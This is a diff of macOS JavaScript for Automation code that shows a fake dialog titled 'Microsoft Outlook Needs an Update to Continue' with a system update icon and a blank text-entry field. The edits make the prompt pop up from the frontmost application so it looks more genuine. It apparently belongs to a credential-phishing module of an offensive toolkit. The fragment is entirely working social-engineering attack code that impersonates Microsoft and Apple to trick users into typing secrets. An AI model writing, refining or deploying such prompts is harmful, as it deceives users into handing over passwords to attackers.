@@ -15,7 +15,7 @@ if (outlookIconexistsCheck == true){
   var title = "Microsoft Outlook Needs an Update to Continue";
   var text = "Microsoft Outlook Needs an Update to Continue";
 } else {
-    var icon = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns";
+    var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
     var title = "An Application Needs an Update to Continue";
     var text = "An Application Needs an Update to Continue";}
 
@@ -23,7 +23,10 @@ if (outlookIconexistsCheck == true){
 	if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
 	if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}
 
-		var prompt = currentApp.displayDialog(text, {
+		var contextAppString = currentApp.systemAttribute('__CFBundleIdentifier').toString()
+		var contextApp = Application(contextAppString)
+		contextApp.includeStandardAdditions = true;
+		var prompt = contextApp.displayDialog(text, {
 			defaultAnswer: "",
 			buttons: ['OK', 'Cancel'],
 			defaultButton: 'OK',
